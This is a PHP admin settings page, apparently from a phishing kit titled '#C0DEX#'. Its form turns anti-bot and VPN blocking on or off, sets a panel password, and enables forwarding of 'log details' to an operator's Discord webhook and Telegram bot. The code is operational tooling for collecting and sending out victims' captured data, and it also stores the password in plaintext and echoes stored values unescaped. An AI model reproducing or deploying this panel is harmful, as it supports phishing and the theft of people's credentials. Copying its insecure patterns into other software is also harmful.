<?php
session_start();
require 'config.php';

if (!isset($_SESSION['login'])) {
    header('Location: login.php');
    exit();
}

function count_c($filename)
{
    $file = fopen($filename, "r");
    $total_click = fread($file, filesize($filename));
    $total_click = substr_count($total_click, "\n");
    return $total_click;
    fclose($file);
}
if (isset($_POST['discordResult'])) {
    unlink("config/discord.ini");
    $click = fopen("config/discord.ini", "a");
    fwrite($click, $_POST['discordResult'] . "\n");
    fclose($click);
}
if (isset($_POST['chatId_telegram'])) {
    unlink("config/chatId.ini");
    $click = fopen("config/chatId.ini", "a");
    fwrite($click, $_POST['chatId_telegram'] . "\n");
    fclose($click);
}
if (isset($_POST['botUrl_telegram'])) {
    unlink("config/botUrl.ini");
    $click = fopen("config/botUrl.ini", "a");
    fwrite($click, $_POST['botUrl_telegram'] . "\n");
    fclose($click);
}
if (isset($_POST['admin_pass'])) {
    unlink("config/pass.ini");
    $click = fopen("config/pass.ini", "a");
    fwrite($click, $_POST['admin_pass'] . "\n");
    fclose($click);
}
if (isset($_POST['blockVpn'])) {
    unlink("config/blockVpn.ini");
    $click = fopen("config/blockVpn.ini", "a");
    fwrite($click, $_POST['blockVpn'] . "\n");
    fclose($click);
}
if (isset($_POST['status_antibots'])) {
    unlink("config/status_antibots.ini");
    $click = fopen("config/status_antibots.ini", "a");
    fwrite($click, $_POST['status_antibots'] . "\n");
    fclose($click);
}
if (isset($_POST['status_discord'])) {
    unlink("config/status_discord.ini");
    $click = fopen("config/status_discord.ini", "a");
    fwrite($click, $_POST['status_discord'] . "\n");
    fclose($click);
}
if (isset($_POST['status_telegram'])) {
    unlink("config/status_telegram.ini");
    $click = fopen("config/status_telegram.ini", "a");
    fwrite($click, $_POST['status_telegram'] . "\n");
    fclose($click);
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>#C0DEX#</title>
    <meta name="description" content="description here">
    <meta name="keywords" content="keywords,here">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
    <link href="https://unpkg.com/tailwindcss/dist/tailwind.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.bundle.min.js" integrity="sha256-XF29CBwU1MWLaGEnsELogU6Y6rcc5nCkhhx89nFMIDQ=" crossorigin="anonymous"></script>

    <link rel="stylesheet" href="css/csss.css">

</head>

<body class="bg-black-alt font-sans leading-normal tracking-normal">
    <?php include 'inc/header.php'; ?>
    <!--Container-->
    <div class="container w-full mx-auto pt-20">

        <div class="w-full px-4 md:px-0 md:mt-8 mb-16 text-gray-800 leading-normal">

            <!--Console Content-->

            <div class="w-full p-3">
                <!--Table Card-->
                <div class="bg-gray-900 border border-gray-800 rounded shadow">
                    <div class="border-b border-gray-800 p-3">
                        <h5 class="font-bold uppercase text-gray-600"><i class="fas fa-sliders-h"></i> Settings</h5>
                    </div>
                    <div class="p-5">
                        <div class="w-full p-5 text-gray-700">

                            <form action="" method="post">
                                <label><i class="fas fa-shield-alt"></i> #Block/Allow VPN </label>
                                <input type="text" style="width: 20%;" class="form-control" name="blockVpn" value="<?php echo file_get_contents('config/blockVpn.ini'); ?>">
                                <br><label><i class="fas fa-robot"></i> #Turn On/Off AntiBots</label>
                                <input type="text" style="width: 20%;" class="form-control" name="status_antibots" value="<?php echo file_get_contents('config/status_antibots.ini'); ?>"><br>

                               <br> <h5 class="font-bold uppercase text-gray-650"><i class="fas fa-user-lock"></i> &nbsp; Admin Panel Config:</h5><br>
                                <div>
                                    <label>// Your Admin Panel Password</label><br>
                                    <input type="text" style="width: 60%;" class="form-control" name="admin_pass" value="<?php echo file_get_contents('config/pass.ini'); ?>">
                                </div><br>
                                <h5 class="font-bold uppercase text-gray-650"><i class="fab fa-discord"></i> &nbsp; Discord Config:</h5><br>
                                <div>
                                    <label><i class="fas fa-power-off"></i> #Send Log Details to Discord</label>
                                    <input type="text" style="width: 20%;" class="form-control" name="status_discord" value="<?php echo file_get_contents('config/status_discord.ini'); ?>"><br>
                                    <label>// Your Discord Webhook URL</label><br>
                                    <input type="text" style="width: 99%;" class="form-control" name="discordResult" value="<?php echo file_get_contents('config/discord.ini'); ?>">
                                </div><br>
                                <h5 class="font-bold uppercase text-gray-650"><i class="fab fa-telegram"></i> &nbsp; Telegram Config:</h5><br>
                                <div>
                                    <label><i class="fas fa-power-off"></i> #Send Log Details to Telegram</label>
                                    <input type="text" style="width: 20%;" class="form-control" name="status_telegram" value="<?php echo file_get_contents('config/status_telegram.ini'); ?>"><br>
                                    <label>// Your Telegram Chat ID</label><br>
                                    <input type="text" style="width: 50%;" class="form-control" name="chatId_telegram" value="<?php echo file_get_contents('config/chatId.ini'); ?>">
                                </div><br>

                                <div>
                                    <label>//Your Telegram Bot Api Key</label><br>
                                    <input type="text" style="width: 99%;" class="form-control" name="botUrl_telegram" value="<?php echo file_get_contents('config/botUrl.ini'); ?>">
                                </div>
                                <br><br>

                                <div class="containerx">
                                    <div class="vertical-center">
                                        <button type="submit" class="btn">Update Config</button>
                                    </div>
                                </div>

                            </form>
                        </div>
                    </div>
                </div>
                <?php include 'inc/footer.php'; ?>
                <script src="js/js.js"></script>
</body>

</html>